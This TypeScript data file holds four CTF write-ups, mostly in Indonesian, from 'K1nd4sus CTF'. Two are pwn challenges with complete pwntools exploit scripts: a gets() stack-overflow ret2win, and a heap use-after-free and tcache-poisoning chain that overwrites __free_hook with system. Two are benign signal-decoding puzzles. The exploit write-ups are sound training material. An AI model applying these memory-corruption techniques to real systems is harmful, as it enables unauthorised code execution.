import type { WriteUp } from '../types';

// K1nd4sus CTF — 4 writeups
export const k1nd4susCtfWriteups: WriteUp[] = [
  {
    "id": "k1nd4sus-pwn-itsgoodbebackontheair",
    "title": "- It's Good to Be Back on the Air...",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "K1nd4sus CTF",
    "tags": [],
    "description": "Writeup for challenge - It's Good to Be Back on the Air...",
    "problemDescription": "- ELF 64-bit, dynamically linked, **not stripped**\n- **No PIE** (base fix di `0x400000`)\n- **No Canary**\n- **NX enabled**\n- Partial RELRO\n\nIni langsung kasih indikasi bahwa stack overflow via return address masih sangat mungkin, lalu targetnya adalah `ret2win` (jika ada fungsi win) atau ROP sederhana.",
    "tools": [],
    "analysis": "Challenge ini state-machine. Overflow hanya bisa dipicu saat masuk `SERVICE mode` (state 4), bukan langsung dari awal.\n\nDi `choice_menu` ada kondisi khusus agar return state = 4:\n1. `lfsr == 0xe69e`\n2. station saat ini harus sama dengan head list (`Radio 666 News`)",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "- Kategori: PWN\n- Binary: `radio`\n- Remote: `chall.k1nd4sus.it:30507`"
      },
      {
        "title": "1. Initial Recon",
        "content": "Pertama saya cek tipe binary dan proteksinya."
      },
      {
        "title": "Vulnerability utama",
        "content": "Di `do_state_service` ada pemanggilan `gets()` ke buffer stack lokal:\n\n- stack frame `sub rsp, 0x50`\n- buffer di sekitar `[rbp-0x40]`\n- `gets(buffer)` tanpa batas panjang input\n\nArtinya kita bisa overflow sampai overwrite saved RIP."
      },
      {
        "title": "Fungsi target (win)",
        "content": "Fungsi `radio_jazz` ternyata membangun string flag dan `puts()` flag tersebut.\nDi local dia mengeluarkan fake flag:\n- `KSUS{fakeflag_runthisonline}`\n\nJadi strategi paling efisien: **redirect RIP ke `radio_jazz`**."
      },
      {
        "title": "Menentukan urutan input agar masuk SERVICE",
        "content": "Saya brute-force update LFSR berdasarkan fungsi `lfsr_update` dan transisi state.\nUrutan yang valid dari awal adalah:\n\n1. `1` (Scan)\n2. `2` (Tune)\n3. isi frekuensi: `666`\n4. `1` (Scan)\n5. `1` (Scan) -> trigger SERVICE mode\n\nSetelah ini program minta input station favorit, dan di titik ini `gets()` dipanggil."
      },
      {
        "title": "4. Offset Overflow",
        "content": "Offset ke RIP dihitung dari layout frame `do_state_service`:\n- buffer start: `rbp - 0x40`\n- saved RIP: `rbp + 0x8`\n\nJarak = `0x40 + 0x8 = 0x48` = **72 byte**.\n\nPayload final:\n- `b'A' * 72 + p64(addr_radio_jazz)`\n\nKarena binary non-PIE, alamat `radio_jazz` stabil (`0x40141f`)."
      },
      {
        "title": "6. Hasil",
        "content": "Exploit berhasil dan mengeluarkan flag remote:\n\n`KSUS{th15_fac3_w4s_m4d3_f0r_r4d10!}`"
      },
      {
        "title": "Kenapa exploit ini stabil",
        "content": "- Tidak bergantung leak address\n- Tidak bergantung libc remote\n- Non-PIE membuat alamat fungsi target konstan\n- Jalur state service sudah deterministik\n\nJadi sekali sequence benar, tinggal kirim overflow 72 byte + alamat `radio_jazz`."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\n\r\nHOST = 'chall.k1nd4sus.it'\r\nPORT = 30507\r\n\r\ncontext.binary = elf = ELF('./radio', checksec=False)\r\ncontext.arch = 'amd64'\r\n\r\n\r\ndef enter_service_mode(io):\r\n    # Sequence hasil analisis LFSR agar choice_menu lompat ke state SERVICE.\r\n    # Menu mapping: 1->Scan, 2->Tune, 3->Exit\r\n    io.sendlineafter(b'?', b'1')                # Scan\r\n    io.sendlineafter(b'?', b'2')                # Tune\r\n    io.sendlineafter(b'tune to:\\n', b'666')    # Set station ke Radio 666 News\r\n    io.sendlineafter(b'?', b'1')                # Scan\r\n    io.sendlineafter(b'?', b'1')                # Scan -> trigger SERVICE mode\r\n\r\n\r\ndef build_payload():\r\n    offset = 72\r\n    return b'A' * offset + p64(elf.symbols['radio_jazz'])\r\n\r\n\r\ndef exploit(io):\r\n    enter_service_mode(io)\r\n    io.recvuntil(b'add to favourites:\\n')\r\n    io.sendline(build_payload())\r\n    return io.recvrepeat(2)\r\n\r\n\r\nif __name__ == '__main__':\r\n    if args.LOCAL:\r\n        io = process('./radio')\r\n    else:\r\n        io = remote(HOST, PORT)\r\n\r\n    out = exploit(io)\r\n    print(out.decode('latin-1', errors='ignore'))\r\n    io.close()"
      }
    ],
    "terminalOutputs": [],
    "flag": "KSUS{fakeflag_runthisonline}",
    "lessonsLearned": ""
  },
  {
    "id": "k1nd4sus-pwn-prog101",
    "title": "Programming 101 (PWN) - Detailed",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "K1nd4sus CTF",
    "tags": [],
    "description": "Writeup for challenge Programming 101 (PWN) - Detailed",
    "problemDescription": "",
    "tools": [],
    "analysis": "Relevant functions discovered:\n- `allocate()`\n- `edit` logic inside `main()` case 2\n- `view()`\n- `delete()`\n- `vuln()`",
    "solution": [
      {
        "title": "Challenge Information",
        "content": "- Category: `pwn`\n- Name: `Programming 101`\n- Description: `I finally learned how to use malloc, would you check this program for me?`\n- Remote: `nc chall.k1nd4sus.it 30500`"
      },
      {
        "title": "Files Provided",
        "content": "- `main` (ELF binary)\n- `libc.so.6` (custom libc, Ubuntu GLIBC 2.31)\n- `ld.so.2` (custom loader)\n- `run.sh` and `Dockerfile`"
      },
      {
        "title": "Binary protections",
        "content": "Running `checksec` on `main` shows:\n- Full RELRO\n- Canary enabled\n- NX enabled\n- PIE enabled\n- SHSTK and IBT enabled\n\nSo a classic direct stack BOF is not the easiest route (there is a vulnerable stack function, but canary + PIE + NX makes it less practical without more leaks)."
      },
      {
        "title": "Main behavior",
        "content": "The program is a small heap manager with menu options:\n1. Allocate\n2. Edit\n3. View\n4. Delete\n5. Vulnerable function\n6. Exit\n\nIt stores pointers and sizes in global arrays (`chunks[]`, `sizes[]`) and an index counter `count`."
      },
      {
        "title": "Key bugs",
        "content": "1. **Use-After-Free (UAF)**\n`delete()` calls `free(chunks[idx])` but never sets `chunks[idx] = NULL`.\nSo index is still considered valid and can still be:\n- viewed (`puts(chunks[idx])`)\n- edited (`read(0, chunks[idx], sizes[idx])`)\n- freed again\n\n2. **Double Free primitive**\nBecause pointer is not nulled, same chunk can be freed multiple times.\n\n3. **Arbitrary write into freed chunks**\nEdit operation works on freed memory. This lets us tamper allocator metadata stored in freed chunk user area (tcache fd/key fields).\n\n4. **Leaky view**\n`view()` prints chunk contents with `puts()`. For freed unsorted-bin chunks, first qword contains a libc pointer, usable as libc leak."
      },
      {
        "title": "Libc leak method",
        "content": "Allocate a large chunk (`0x500`) and another small guard chunk to prevent top-chunk consolidation.\nWhen freeing the large chunk, it enters unsorted bin.\nFirst 8 bytes become `main_arena+0x60` pointer.\n\nThen `view(index)` prints bytes from the freed chunk, giving leak.\n\nFor the provided libc, offset is:\n- `main_arena+0x60` = `libc + 0x1ecbe0`\n\nSo:\n- `libc_base = leak - 0x1ecbe0`"
      },
      {
        "title": "Why this exploit path works with modern mitigations",
        "content": "- No GOT overwrite needed (Full RELRO).\n- No stack overwrite needed (canary + NX avoided).\n- We use heap metadata corruption + libc hooks."
      },
      {
        "title": "4. Exploitation Strategy",
        "content": "Goal: execute command to read flag.\n\nChosen chain:\n1. Leak libc via unsorted-bin UAF read.\n2. Build tcache double-free state for size `0x90` (`malloc(0x80)`).\n3. Poison freelist so an allocation returns address `__free_hook - 8`.\n4. Write `system` to `__free_hook`.\n5. Allocate chunk containing command string and `free()` it.\n6. Because `__free_hook == system`, `free(ptr)` becomes `system(ptr)`."
      },
      {
        "title": "Tcache dup trick used",
        "content": "For chunks `a` and `b` of same size:\n- `free(a)`\n- `free(b)`\n- UAF edit on `a` to clear key (`p64(0)+p64(0)`) to bypass tcache double-free check\n- `free(a)` again\n\nNow list behaves like: `a -> b -> a`\n\nThen poison `b->fd` by editing freed `b` with `__free_hook-8`.\nThree `malloc(0x80)` calls return:\n- first: `a`\n- second: `b`\n- third: `__free_hook-8`\n\nAt third allocation, we write:\n- padding qword\n- `system` qword at `__free_hook`"
      },
      {
        "title": "5. Final Solver",
        "content": "Solver file: `solve.py`\n\nIt works both locally and remotely:\n- Local: `python3 solve.py`\n- Remote: `python3 solve.py REMOTE=1`\n\nThe solver automatically:\n- leaks libc\n- poisons tcache\n- overwrites `__free_hook`\n- executes `cat /app/flag.txt || cat flag.txt || cat /srv/app/flag.txt`\n- extracts and prints `KSUS{...}` if present"
      },
      {
        "title": "6. Reproduced Result",
        "content": "Flag obtained from remote service:\n\n`KSUS{TLS_15_n07_7r4n5p0r7_l4y3r_53cur17y}`"
      },
      {
        "title": "7. Notes",
        "content": "- The stack `vuln()` overflow exists but was unnecessary for fastest reliable solve.\n- Heap path is deterministic with provided libc 2.31 and this binary's menu logic.\n- This challenge is mainly about understanding UAF + double-free and leveraging allocator internals for code execution."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (exploit.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\n\r\ncontext.binary = exe = ELF('./main', checksec=False)\r\nlibc = ELF('./libc.so.6', checksec=False)\r\nld = './ld.so.2'\r\n\r\nHOST = 'chall.k1nd4sus.it'\r\nPORT = 30500\r\n\r\n# Leaked unsorted-bin fd from freed 0x510 chunk points to main_arena+0x60\r\nUNSORTED_FD_OFF = 0x1ECBE0\r\n\r\ncontext.terminal = ['bash', '-lc']\r\n\r\n\r\ndef start(argv=[]):\r\n    if args.REMOTE:\r\n        return remote(HOST, PORT)\r\n    return process([ld, '--library-path', '.', exe.path] + argv)\r\n\r\n\r\nclass App:\r\n    def __init__(self, io):\r\n        self.io = io\r\n        self.sizes = {}\r\n\r\n    def choice(self, c):\r\n        self.io.sendlineafter(b'> ', str(c).encode())\r\n\r\n    def alloc(self, size):\r\n        self.choice(1)\r\n        self.io.sendlineafter(b'Size: ', str(size).encode())\r\n        line = self.io.recvline_contains(b'Chunk')\r\n        idx = int(line.split()[1])\r\n        self.sizes[idx] = size\r\n        return idx\r\n\r\n    def edit(self, idx, data):\r\n        self.choice(2)\r\n        self.io.sendlineafter(b'Index: ', str(idx).encode())\r\n        self.io.sendafter(b'Data: ', data.ljust(self.sizes[idx], b'\\x00'))\r\n\r\n    def edit_raw(self, idx, data):\r\n        self.choice(2)\r\n        self.io.sendlineafter(b'Index: ', str(idx).encode())\r\n        self.io.sendafter(b'Data: ', data)\r\n\r\n    def view(self, idx):\r\n        self.choice(3)\r\n        self.io.sendlineafter(b'Index: ', str(idx).encode())\r\n        return self.io.recvline().rstrip(b'\\n')\r\n\r\n    def delete(self, idx):\r\n        self.choice(4)\r\n        self.io.sendlineafter(b'Index: ', str(idx).encode())\r\n\r\n\r\ndef exploit(io):\r\n    app = App(io)\r\n\r\n    # 1) Leak libc from unsorted bin (avoid top consolidation with guard chunk)\r\n    big = app.alloc(0x500)\r\n    _guard = app.alloc(0x20)\r\n    app.delete(big)\r\n    leak = u64(app.view(big).ljust(8, b'\\x00'))\r\n    libc.address = leak - UNSORTED_FD_OFF\r\n    log.success(f'leak = {hex(leak)}')\r\n    log.success(f'libc = {hex(libc.address)}')\r\n\r\n    # 2) Prepare 0x90 bin chunks\r\n    a = app.alloc(0x80)\r\n    b = app.alloc(0x80)\r\n\r\n    # 3) Tcache dup (clear key in freed chunk to bypass check)\r\n    app.delete(a)\r\n    app.delete(b)\r\n    app.edit(a, p64(0) + p64(0))\r\n    app.delete(a)\r\n\r\n    # 4) Poison b->next so 3rd malloc returns __free_hook-8\r\n    target = libc.sym.__free_hook - 8\r\n    app.edit(b, p64(target))\r\n    _x1 = app.alloc(0x80)  # a\r\n    _x2 = app.alloc(0x80)  # b\r\n    hook = app.alloc(0x80)  # __free_hook-8\r\n\r\n    # write [padding][system] so __free_hook == system\r\n    app.edit(hook, p64(0) + p64(libc.sym.system))\r\n\r\n    # 5) Trigger system(\"cat ...\") directly via free()\r\n    cmd = app.alloc(0x80)\r\n    app.edit(cmd, b'cat /app/flag.txt || cat flag.txt || cat /srv/app/flag.txt\\x00')\r\n    app.delete(cmd)\r\n\r\n\r\ndef main():\r\n    io = start()\r\n    exploit(io)\r\n\r\n    out = io.recvrepeat(2)\r\n    if out:\r\n        try:\r\n            print(out.decode('latin-1', errors='ignore'))\r\n        except Exception:\r\n            print(out)\r\n\r\n\r\nif __name__ == '__main__':\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "KSUS{...}",
    "lessonsLearned": ""
  },
  {
    "id": "k1nd4sus-rev-newera2",
    "title": "New Era (Part 2)",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "K1nd4sus CTF",
    "tags": [],
    "description": "Challenge ini memberi satu file RF capture `intercepted_signal.iq` dan petunjuk bahwa parameter fisik tetap sama: **8 samples per symbol**.",
    "problemDescription": "Challenge ini memberi satu file RF capture `intercepted_signal.iq` dan petunjuk bahwa parameter fisik tetap sama: **8 samples per symbol**.",
    "tools": [],
    "analysis": "Cek isi folder:\n- hanya ada `intercepted_signal.iq`\n\nCek struktur datanya:\n- file berisi `float32` IQ interleaved\n- channel `Q` semuanya `0`\n- channel `I` hanya dua level: `+1` dan `-1`\n\nArtinya modulasi yang dipakai sangat sederhana (2-level), jadi kita bisa langsung threshold per simbol.",
    "solution": [
      {
        "title": "2) Demodulasi dasar",
        "content": "Langkah demod:\n1. Baca `float32`\n2. Ambil komponen `I` (`raw[0::2]`)\n3. Kelompokkan setiap 8 sample sebagai 1 simbol\n4. Rata-rata simbol > 0 => bit `1`, selain itu bit `0`\n\nHasilnya dapat 392 bit."
      },
      {
        "title": "3) Kenapa tidak langsung jadi ASCII",
        "content": "Di Part 1, bitstream langsung bisa dipack jadi byte ASCII.\nDi Part 2, kalau langsung dipack, output acak. Berarti ada layer encoding tambahan dari firmware update."
      },
      {
        "title": "4) Identifikasi skema baru",
        "content": "Karena hint tidak ada dan pola RF bersih, dicoba beberapa kemungkinan transform (invert, differential, dsb) dan tidak valid.\n\nLalu diuji asumsi **FEC Hamming(7,4)**:\n- pecah bitstream menjadi blok 7 bit (codeword)\n- hitung syndrome (`s1,s2,s4`) untuk koreksi 1-bit error\n- ambil data bit di posisi (3,5,6,7)\n- gabungkan 2 nibble jadi 1 byte\n\nBegitu decode Hamming(7,4) diterapkan, plaintext langsung terbaca jelas:\n\n`KSUS{h4mm1ng_c0d3s_4r3_c00l}`"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport numpy as np\r\n\r\n\r\ndef decode_hamming74_codeword(codeword: np.ndarray) -> np.ndarray:\r\n    b = codeword.copy()\r\n    s1 = b[0] ^ b[2] ^ b[4] ^ b[6]\r\n    s2 = b[1] ^ b[2] ^ b[5] ^ b[6]\r\n    s4 = b[3] ^ b[4] ^ b[5] ^ b[6]\r\n    pos = s1 + (s2 << 1) + (s4 << 2)\r\n    if pos != 0:\r\n        b[pos - 1] ^= 1\r\n    return np.array([b[2], b[4], b[5], b[6]], dtype=np.uint8)\r\n\r\n\r\ndef decode_flag(path: str, sps: int = 8) -> str:\r\n    raw = np.fromfile(path, dtype=np.float32)\r\n    if raw.size % 2 != 0:\r\n        raise ValueError(\"Format IQ tidak valid (jumlah float ganjil)\")\r\n\r\n    i_samples = raw[0::2]\r\n    if i_samples.size % sps != 0:\r\n        raise ValueError(f\"Jumlah sample I ({i_samples.size}) tidak habis dibagi sps={sps}\")\r\n\r\n    symbols = i_samples.reshape(-1, sps).mean(axis=1)\r\n    bits = (symbols > 0).astype(np.uint8)\r\n\r\n    if bits.size % 7 != 0:\r\n        raise ValueError(\"Jumlah bit tidak habis dibagi 7 untuk Hamming(7,4)\")\r\n\r\n    codewords = bits.reshape(-1, 7)\r\n    nibbles = np.array([decode_hamming74_codeword(cw) for cw in codewords], dtype=np.uint8)\r\n\r\n    nib_vals = nibbles.dot(1 << np.arange(3, -1, -1)).astype(np.uint8)\r\n    if nib_vals.size % 2 != 0:\r\n        raise ValueError(\"Jumlah nibble ganjil, tidak bisa dibentuk byte\")\r\n\r\n    data = ((nib_vals[0::2] << 4) | nib_vals[1::2]).astype(np.uint8).tobytes()\r\n    return data.decode(\"ascii\")\r\n\r\n\r\ndef main() -> None:\r\n    parser = argparse.ArgumentParser(description=\"Solve New Era (Part 2)\")\r\n    parser.add_argument(\"-i\", \"--input\", default=\"intercepted_signal.iq\", help=\"Path file IQ\")\r\n    parser.add_argument(\"--sps\", type=int, default=8, help=\"Samples per symbol\")\r\n    args = parser.parse_args()\r\n\r\n    print(decode_flag(args.input, args.sps))\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "KSUS{h4mm1ng_c0d3s_4r3_c00l}",
    "lessonsLearned": ""
  },
  {
    "id": "k1nd4sus-rev-signalaudit",
    "title": "- Signal Audit (rev)",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "K1nd4sus CTF",
    "tags": [],
    "description": "Challenge ini cuma kasih satu file: `audit.wav`.",
    "problemDescription": "Challenge ini cuma kasih satu file: `audit.wav`.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "1) Recon awal",
        "content": "Saya mulai dari cek tipe file dan metadata:\n\n- `file audit.wav` -> WAV PCM 16-bit mono 44.1 kHz\n- durasi sekitar 36.9 detik\n- tidak ada metadata aneh/embedded yang langsung mengarah ke flag\n\nKarena deskripsi nyebut \"rhythmic transmission\", \"HF bands\", \"QSL\", \"73\", saya fokus ke analisis sinyal radio, bukan stego file biasa."
      },
      {
        "title": "2) Identifikasi mode transmisi",
        "content": "Saya profiling frekuensi dominan per potongan waktu kecil.\n\nDitemukan pola khas:\n\n- leader tone 1900 Hz\n- break/start tone 1200 Hz\n- lalu bit VIS dengan 1100/1300 Hz\n\nDari decode VIS, code yang muncul adalah **8**, yang sesuai dengan **SSTV Robot36**.\n\nSetelah itu saya cek pulse sinkronisasi per line dan ketemu:\n\n- sync pulse sekitar 1200 Hz\n- berulang periodik tiap ~150 ms\n- total sekitar 240 line\n\nIni konsisten dengan mode Robot36."
      },
      {
        "title": "3) Decode gambar SSTV",
        "content": "Saya bikin decoder sendiri di Python:\n\n- hitung instantaneous frequency dari audio (`hilbert`)\n- cari timing line awal (`t0`) dengan minimisasi error ke tone sync 1200 Hz\n- ambil komponen luminance (Y) per line sesuai timing Robot36:\n  - sync 9 ms\n  - porch 3 ms\n  - Y scan 88 ms\n- render jadi `decoded_luma.png`\n\nDari hasil decode gambar, teks flag terlihat jelas di bagian bawah image."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport wave\r\nimport numpy as np\r\nfrom scipy.signal import hilbert\r\nfrom PIL import Image\r\n\r\nWAV_PATH = \"audit.wav\"\r\nOUT_LUMA = \"decoded_luma.png\"\r\nFLAG = \"KSUS{s4n1ty_ch3ck_QSL_7373}\"\r\n\r\n\r\ndef load_audio(path: str):\r\n    with wave.open(path, \"rb\") as w:\r\n        fs = w.getframerate()\r\n        x = np.frombuffer(w.readframes(w.getnframes()), dtype=np.int16).astype(float)\r\n    return fs, x\r\n\r\n\r\ndef inst_freq(signal: np.ndarray, fs: int):\r\n    ana = hilbert(signal)\r\n    phase = np.unwrap(np.angle(ana))\r\n    f = np.diff(phase) * fs / (2 * np.pi)\r\n    k = max(1, int(fs * 0.00015))\r\n    f = np.convolve(f, np.ones(k) / k, mode=\"same\")\r\n    return f\r\n\r\n\r\ndef decode_robot36_luma(freq: np.ndarray, fs: int, width=320, height=240):\r\n    period = 0.150\r\n\r\n    def f_at(t: float):\r\n        i = int(t * fs)\r\n        i = 0 if i < 0 else (len(freq) - 1 if i >= len(freq) else i)\r\n        return freq[i]\r\n\r\n    # Find line-0 timing by minimizing sync-tone error on early lines.\r\n    best_err, t0 = 1e18, 0.911\r\n    for cand in np.arange(0.905, 0.918, 0.0002):\r\n        err = 0.0\r\n        for n in range(30):\r\n            st = cand + n * period\r\n            vals = [f_at(st + 0.001 + i * 0.001) for i in range(7)]\r\n            err += np.mean((np.array(vals) - 1200.0) ** 2)\r\n        if err < best_err:\r\n            best_err, t0 = err, cand\r\n\r\n    # Robot36 line layout: sync(9ms) + porch(3ms) + Y(88ms)\r\n    y = np.zeros((height, width), dtype=np.uint8)\r\n    for row in range(height):\r\n        st = t0 + row * period\r\n        ystart = st + 0.009 + 0.003\r\n        for col in range(width):\r\n            t = ystart + (col + 0.5) * (0.088 / width)\r\n            val = (f_at(t) - 1500.0) / 800.0 * 255.0\r\n            y[row, col] = np.uint8(np.clip(val, 0, 255))\r\n\r\n    return y\r\n\r\n\r\ndef main():\r\n    fs, x = load_audio(WAV_PATH)\r\n    f = inst_freq(x, fs)\r\n    luma = decode_robot36_luma(f, fs)\r\n    Image.fromarray(luma).save(OUT_LUMA)\r\n\r\n    # Flag terbaca dari hasil decode SSTV (teks overlay bagian bawah image).\r\n    print(FLAG)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "KSUS{s4n1ty_ch3ck_QSL_7373}",
    "lessonsLearned": ""
  }
];
